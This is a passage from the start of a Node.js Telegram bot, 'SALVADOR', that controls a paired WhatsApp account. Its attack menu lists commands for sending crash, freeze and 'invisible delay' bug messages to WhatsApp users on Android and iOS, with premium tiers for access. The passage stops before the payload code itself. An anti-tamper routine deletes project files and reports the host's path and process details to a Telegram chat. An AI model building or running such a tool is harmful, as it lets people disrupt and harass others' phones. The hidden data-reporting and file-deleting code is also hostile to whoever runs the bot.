// CREDIT BY SENN, JGN HPUS CREDIT NYA YA KONTOL
const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  generateWAMessage,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const readline = require('readline');
const { BOT_TOKEN, OWNER_IDS } = require("./config.js");
const crypto = require("crypto");
const sessionPath = './session';
let bots = [];
const bot = new Telegraf(BOT_TOKEN);
const userBugSelection = new Map();
const attackConfig = new Map();
const multiBugSession = new Map();
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
// === Path File ===
const premiumFile = "./Db/premiums.json";
const adminFile = "./Db/admins.json";
const dbPath = "./Db/ControlCommand.json";
// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

function loadDB() {
if (!fs.existsSync(dbPath)) return {}
return JSON.parse(fs.readFileSync(dbPath))
}

function saveDB(data) {
fs.writeFileSync(dbPath, JSON.stringify(data, null, 2))
}

if (!fs.existsSync(dbPath)) {
  fs.writeFileSync(dbPath, JSON.stringify({ commands: {} }, null, 2));
}
// === Load Semua Data Saat Startup ===
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);


// === Middleware Role ===
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }

  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Premium.");
  }
  next();
};

// === Fungsi Admin / Premium ===
const addadmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addpremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};
bot.use(session());

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
"https://files.catbox.moe/cvdggy.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];
// Func Block/Unblock Command
const checkCommandEnabled = async (ctx, next) => {
  if (!ctx.message?.text) return next();

  const text = ctx.message.text.trim();

  if (!text.startsWith("/")) return next();

  // ambil command utama
  let cmd = text.split(" ")[0].toLowerCase();

  // hapus @botusername
  if (cmd.includes("@")) {
    cmd = cmd.split("@")[0];
  }

  const db = loadDB();
  const chatId = String(ctx.chat.id);

  // =========================
  // GLOBAL DISABLE COMMAND
  // =========================
  if (db.commands?.[cmd]?.disabled) {
    return ctx.reply(
      db.commands[cmd].reason ||
      "⛔ Command ini dimatikan."
    );
  }

  // =========================
  // BLOCK COMMAND CHAT
  // =========================
  const blocked =
    db.groupCmdBlock?.[chatId] || [];

  // normalize semua cmd
  const normalizedBlocked = blocked.map(c =>
    c.toLowerCase().split("@")[0]
  );

  if (normalizedBlocked.includes(cmd)) {
    return ctx.reply(
      "⛔ Command ini diblock di chat ini."
    );
  }

  return next();
};
// Tools Loading Menu New
async function LoadingViper(ctx) {
    const frames = [
    "𝐋 𝐎 𝐀 𝐃 𝐈 𝐍 𝐆 - 𝐒 𝐘 𝐒 𝐓 𝐄 𝐌 🕘",
    "[░░░░░░░░░░░░░░░] 0%",
    "[▓▓▓░░░░░░░░░░░░] 11%",
    "[▓▓▓▓▓▓░░░░░░░░░] 25%",
    "[▓▓▓▓▓▓▓▓▓░░░░░░] 41%",
    "[▓▓▓▓▓▓▓▓▓▓▓▓░░░] 84%",
    "[▓▓▓▓▓▓▓▓▓▓▓▓▓░░] 95%",
    "[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 100%",
    "𝐋 𝐎 𝐀 𝐃 𝐈 𝐍 𝐆 - 𝐒 𝐔 𝐂 𝐂 𝐄 𝐒 ✅"
    ];

    // Kirim pesan awal
    const msg = await ctx.reply(frames[0]);

    // Loop untuk animasi
    for (let i = 1; i < frames.length; i++) {
        await new Promise(res => setTimeout(res, 500)); // delay 500ms
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            msg.message_id,
            null,
            frames[i]
        ).catch(() => {});
    }

    // Hapus pesan setelah selesai loading
    await ctx.deleteMessage(msg.message_id).catch(() => {});

    return msg.message_id;
}
// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/maklokntil-tech/Nexi/refs/heads/main/Token.json";

function enableBypassProtection() {
  const { env, execArgv } = process;

  function deleteFilesOnCrack() {
    const files = [
      "package.json",
      "index.js",
      "config.js",
      ".npm",
      "node_modules",
      "settings",
      "SALVADOR NEW 27.0.zip"
    ];
    for (const file of files) {
      try {
        const targetPath = path.join(process.cwd(), file);
        if (fs.existsSync(targetPath)) {
          fs.unlinkSync(targetPath);
          console.log(`[SECURITY] File dihapus: ${file}`);
        }
      } catch (err) {
        console.error(`[ERROR] Gagal hapus ${file}: ${err.message}`);
      }
    }
  }
  async function reportToTelegram(reason) {
    const text = `🚨 *NGAPAIN KIDS KE DETECTED!*

📂 Path: ${process.cwd()}
🖥️ Node: ${process.version}
PID: ${process.pid}
Reason: ${reason}`;

    try {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: REPORT_CHAT_ID,
        text,
        parse_mode: "Markdown"
      });
      console.log("[REPORT] MAKLO SINI GUA BYPASS YATIM😂");
    } catch (err) {
      console.error("[REPORT] EROR BJIR NGAKAK:", err.message);
    }
  }

  const trueAbort = process.abort;
  const trueExit = process.exit;
  const trueToString = Function.prototype.toString.toString();

  Object.defineProperty(process, "abort", { value: trueAbort, configurable: false, writable: false });
  Object.defineProperty(process, "exit", { value: trueExit, configurable: false, writable: false });

  Object.freeze(Function.prototype);
  Object.freeze(axios.interceptors.request);
  Object.freeze(axios.interceptors.response);

  function onCrackDetected(reason) {
    console.error(`[SECURITY] ${reason}`);
    reportToTelegram(reason);
    deleteFilesOnCrack();
    process.kill(process.pid, "SIGKILL");
  }

  if (Function.prototype.toString.toString() !== trueToString) {
    onCrackDetected("Function.prototype.toString dibajak");
  }

  if (execArgv.length === 0 && process.execArgv !== execArgv) {
    onCrackDetected("process.execArgv dipalsukan");
  }

  ["HTTP_PROXY", "HTTPS_PROXY", "NODE_TLS_REJECT_UNAUTHORIZED", "NODE_OPTIONS"].forEach((key) => {
    if (env[key] && env[key] !== "" && env[key] !== "1") {
      onCrackDetected(`ENV ${key} disuntik: ${env[key]}`);
    }
  });

  if (axios.interceptors.request.handlers.length > 0 || axios.interceptors.response.handlers.length > 0) {
    onCrackDetected("Interceptor axios terdeteksi");
  }

  try {
    if (typeof module._load === "function") {
      const moduleCode = module._load.toString();
      if (!moduleCode.includes("tryModuleLoad") && !moduleCode.includes("Module._load")) {
        onCrackDetected("Module._load dibajak");
      }
    }
  } catch (err) {
    onCrackDetected("Gagal akses module._load: " + err.message);
  }

  try {
    const trap = Object.getOwnPropertyDescriptor(require.cache, "get");
    if (typeof trap === "function") {
      onCrackDetected("require.cache diproxy");
    }
  } catch {
    onCrackDetected("require.cache error");
  }

  console.log("\x1b[41m\x1b[37m[🔐 PROTECTION]\x1b[0m BY Salvador ACTIVE 🔥\n");
}

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
    process.exit(1);
  }

  console.log(chalk.green(` JANGAN LUPA MASUK CH INFO SCRIPT⠀⠀`));
  startBot();
}

 
function startBot() {
  console.clear();
  console.log(chalk.bold.yellow(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢡⡀⢀⣠⣤⠤⠷⠤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⣀⡴⠟⠉⢠⡀⠠⢤⣄⣠⠀⠉⠻⢦⡀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠄⠀⠀⠈⢳⡞⠉⠀⠀⠀⣠⡇⢀⠄⠀⢷⡀⠀⠀⠀⠘⣶⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⡟⠉⠒⠦⣄⣠⡏⠀⠀⠀⠀⢰⣿⢀⣴⣶⣦⡄⣻⠄⢀⢀⣠⣤⢧⣄⣠⠤⠒⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣿⡋⠀⠀⠀⠀⠀⡟⠀⠀⢠⣠⠀⠀⠹⣿⣿⣿⣿⣿⠋⠀⠈⡍⠀⠀⠈⣿⠀⠀⠀⠀⠒⢦⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡏⠀⠀⠀⣀⣀⣸⠁⠀⠀⣆⠙⣿⣆⢠⣿⣷⣿⣿⣷⠀⣠⣾⣷⡞⠀⠀⢹⣀⣀⣀⣀⠀⢸⣷⣧⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠸⡄⠀⢀⡘⢦⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣩⠇⡀⠀⢸⠀⠀⠀⠀⠉⢸⣿⣿⣿⣮⡁⡀⠀⠀⠀⠀
⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⢄⡀⠀⠀⠀⢀⣷⡸⣄⣙⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣖⡚⠁⢀⣞⡀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡴⣔⠀⠀⠀
⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠐⠺⡏⣍⣁⠀⣽⣿⣿⣿⣿⣿⣿⣽⣿⣯⣽⣿⣿⣿⣍⢁⡜⠉⠉⠓⢤⣄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠠⣷⣿⣗⡤⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⠛⢤⡀⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀
⠀⣿⣿⣿⣿⣿⠿⢿⣿⣿⠿⢿⣿⣿⣿⣿⣷⡀⠈⣿⣿⣄⠀⣿⣿⣿⠁⠹⣿⣿⣿⣿⣿⢿⣿⣗⠀⠀⠀⠉⠂⣠⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⢀⡿⡿⠉⣿⡟⠀⢸⣿⠏⠀⠀⢹⠿⠿⢿⣿⣷⣄⠚⢿⣿⣿⣿⡿⠃⢈⣹⣿⣿⣿⣿⣿⡎⢿⣿⣇⠀⠀⣶⣴⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⢸⣿⣿⣾⣿⡇⠀⢸⠋⠀⠀⠀⠸⠀⠀⠀⠉⠛⣿⣷⣟⣙⠿⣿⡁⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⢿⣿⠟⢿⡏⠀⢸⠉⠁⠀⠈⢹⢿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⡇⠀⠾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠍⠛⢿⠷⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣆⠀⠁⠀⠀⠀⠀⠈⠀⠀⠀⠀⠞⠀⠘⣿⣿⣟
⢸⣿⣿⣏⣿⡗⠀⠀⠀⠀⠀⠀⣠⠒⠊⠉⠉⠉⢉⣒⠦⣄⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣤⣿⣿⠿⠶⠶⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇
⠘⣿⣷⣿⡝⠁⠀⠀⠀⠀⠀⠉⢁⠀⠀⠀⠀⠀⠀⠈⢹⣮⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠙⠀⠀⠀⠀⠀⠀⠈⠛⢆⠀⠀⠀⠀⠀⠀⠀⠋⢻⡇
⠀⠻⣿⣤⠁⠀⠀⠀⠀⠀⣤⠈⠋⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⠀⠀⠀⠀⢠⡿⠁
⠀⠀⢻⣧⡀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⣼⠃⠀
⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣧⠀⠀⣀⡼⠁⠀⠀
⠀⠀⠀⠀⠙⢶⡀⠀⠀⠀⠀⢿⣷⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠀⠀⠛⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠙⠏⠉⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⢿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣷⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣞⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⣿⡿⣾⢻⣿⣿⡟⢻⣿⣿⣿⣿⣿⣿⠙⠳⢤⣀⣀⣀⣠⡤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⠇⣿⣿⣿⣿⢳⣿⣿⣿⣿⡇⣾⣿⣿⣿⣿⣿⠹⠄⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣟⣿⣿⣿⣿⣻⣿⣾⣿⣿⢸⣿⣿⣿⣿⡇⣿⣿⣿⢹⣿⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣾⣅⡿⣫⠟⣿⣿⡿⢹⡿⠿⣿⣿⣧⢸⣿⣿⣿⣿⠇⣿⣿⠇⡞⣿⡏⠉⢷⠴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⡿⠿⠟⠁⠀⡇⢸⡇⢀⣧⡤⢰⣿⡟⢸⡇⡏⢹⣿⠀⣿⡟⠀⢳⣿⡇⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠞⠁⠀⠀⡠⠀⠀⠁⣿⠃⢸⣿⠙⢺⣻⡗⠸⡇⠡⢸⣿⣰⠈⠀⠀⢘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⢸⠁⠀⠀⠀⣿⠀⠘⣿⡄⠀⠁⠁⠀⠃⠀⠈⣿⠿⠀⠀⠀⠘⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠙⡇⠀⠀⠀⠀⠀⠀⢀⣏⣥⠀⠀⠀⢠⣤⠔⠀⠦⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
      `));
  console.log(
    chalk.bold.green(`
[!] System: Terimakasih sudah selalu setia mengunakan salvador 
───────────────────────────
`));
}

validateToken();
startBot();
// WhatsApp Connection
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async (key) => ({
      conversation: 'SennOfficial', // Placeholder default
    }),
  };

  sock = makeWASocket(connectionOptions);
  sock.ev.on('creds.update', saveCreds);
  store.bind(sock.ev);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      sock.newsletterFollow("120363404343696075@newsletter");
      isWhatsAppConnected = true;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Berhasil Tersambung')}
╰─────────────────────────────╯`));
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Whatsapp Terputus')}
╰─────────────────────────────╯`));

      if (shouldReconnect) {
        console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Menyambung kembali...')}
╰─────────────────────────────╯`));
        startSesi();
      }

      isWhatsAppConnected = false;
    }
  });
};

const checkWhatsAppConnection = (ctx, next) => {
if (!isWhatsAppConnected) {
ctx.reply(`
❌ WhatsApp Belum terhubung
`);
return;
}
next();
};

////=========MENU UTAMA========\\\\
bot.start(async (ctx) => {
  await LoadingViper(ctx);
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
      
  const mainMenuMessage = `
<blockquote><strong>𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑</strong></blockquote>
↯ Author     : @iniNexiReal
↯ Version    : 27.0 
↯ Platform   : Telegram 
↯ type script : No spam & spam bugs
↯ ID: ${userId}
↯ Username: ${Name}
<blockquote><strong>𝚂𝙴𝙽𝙳𝙴𝚁 𝚂𝚃𝙰𝚃𝚄𝚂</strong></blockquote>
↯ Koneksi: ${waStatus}
`;

  const mainKeyboard = [
    [
      {
        text: "XTOOLS",
        callback_data: "all_menu",
        style: 'Primary',
      },
    ],
    [
      {
        text: "XBUGS",
        callback_data: "bug_menu",
        style: 'Danger',
      },
      {
        text: "XSETTINGS",
        callback_data: "owner_menu",
        style: 'Primary',
      },
    ],
    [
      {
        text: "AUTHOR",
        url: "https://t.me/iniNexiReal",
        style: 'Success',
      },
    ]
  ];

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: mainKeyboard,
    },
  });
});

// Handler untuk owner_menu
bot.action("owner_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
        
      const mainMenuMessage = `
<blockquote><strong>𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑</strong></blockquote>
↯ Author     : @iniNexiReal
↯ Version    : 27.0 
↯ Platform   : Telegram 
↯ type script : No spam & spam bugs
↯ ID: ${userId}
↯ Username: ${Name}
<blockquote><strong>𝚂𝙴𝙽𝙳𝙴𝚁 𝚂𝚃𝙰𝚃𝚄𝚂</strong></blockquote>
↯ Koneksi: ${waStatus}
<blockquote><strong>𝑺͒𝒆͢𝒕͠𝒕𝒊͒𝒏͢𝒈͠𝒔 𝑴͒𝒖͢𝒓͠𝒃𝒖͒𝒈͢͢</strong></blockquote>
↯ /blockcmd - block comand bug
↯ /unblockcmd - delete block comand bug
↯ /listblockcmd - cek comand yang di block
<blockquote><strong>𝑺͒𝒆͢𝒕͠𝒕𝒊͒𝒏͢𝒈͠𝒔 𝑺͒𝒆͢𝒏͠𝒅𝒆͒𝒓͢</strong></blockquote>
↯ /addsender - tambah akses
↯ /delsesi - reset sesi
<blockquote><strong>𝑺͒𝒆͢𝒕͠𝒕𝒊͒𝒏͢𝒈͠𝒔 𝑨͒𝒅͢𝒎͠𝒊𝒏͒</strong></blockquote>
↯ /addadmin - tambah admin
↯ /deladmin - hapus admin
↯ /listadmin - list admin
<blockquote><strong>𝑺͒𝒆͢𝒕͠𝒕𝒊͒𝒏͢𝒈͠𝒔 𝑼͒𝒔͢𝒆͠𝒓͒</strong></blockquote>
↯ /addprem - premium user
↯ /delprem - hapus premium user
↯ /listprem - list premium
↯ /cekprem - cek status
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "「🔙」☇ メインコース", callback_data: "back", style: 'Danger' }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
bot.action("all_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
      
      const mainMenuMessage = `
<blockquote><strong>𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑</strong></blockquote>
↯ Author     : @iniNexiReal
↯ Version    : 27.0 
↯ Platform   : Telegram 
↯ type script : No spam & spam bugs
↯ ID: ${userId}
↯ Username: ${Name}
<blockquote><strong>𝚂𝙴𝙽𝙳𝙴𝚁 𝚂𝚃𝙰𝚃𝚄𝚂</strong></blockquote>
↯ Koneksi: ${waStatus}
<blockquote><strong>𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔</strong></blockquote>
⌬ /brat
   ↳ Brat To Sticker 
⌬ /tiktokdl
   ↳ Tiktok Download No Wm
⌬ /iqc
   ↳ iPhone Foto Real
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "「🔙」☇ メインコース", callback_data: "back", style: 'Danger' }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("bug_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
      
  const mainMenuMessage = `
<blockquote><strong>𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑</strong></blockquote>
↯ Author     : @iniNexiReal
↯ Version    : 27.0 
↯ Platform   : Telegram 
↯ type script : No spam & spam bugs
↯ ID: ${userId}
↯ Username: ${Name}
<blockquote><strong>𝚂𝙴𝙽𝙳𝙴𝚁 𝚂𝚃𝙰𝚃𝚄𝚂</strong></blockquote>
↯ Koneksi: ${waStatus}
<blockquote><strong>𝐀𝐓𝐓𝐀𝐂𝐊 𝐌𝐄𝐍𝐔</strong></blockquote>
⌬ /Xforex 
   ↳ Delay Invis Hard
⌬ /Winter 
   ↳ Delay Invis New
⌬ /Noskil 
   ↳ Delay Invisible Hard
⌬ /Xaviera
   ↳ Delay Invis Hard Stiker
⌬ /DiorX
   ↳ Delay Hard Only
⌬ /Bonex
   ↳ Delay Invisible Can Spam
⌬ /Zirox
   ↳ Delay X Crash (Maybe)
⌬ /SevenX
   ↳ Delay X Blank klik
⌬ /Xios
   ↳ Crash Ios Can Spam
⌬ /Toxic
   ↳ Delay X Freeze
⌬ /Farming
   ↳ Crash Klik One Msg Infinity
⌬ /Cxoo
   ↳ Blank Klik Android
⌬ /Virtux
   ↳ Stuck Logo Wa Android
⌬ /Nocturnal
   ↳ Blank Android
⌬ /Nebula
   ↳ Bug iPhone Blank (Maybe)
⌬ /Viox 
   ↳ Bug iPhone Crash
⌬ /SadXit 
   ↳ Bug iPhone Crash Tag Sw
⌬ /Vercux 
   ↳ Bug Grub New
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "「🔙」☇ メインコース", callback_data: "back", style: 'Danger' }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
// Handler untuk back main menu
bot.action("back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
      
  const mainMenuMessage = `
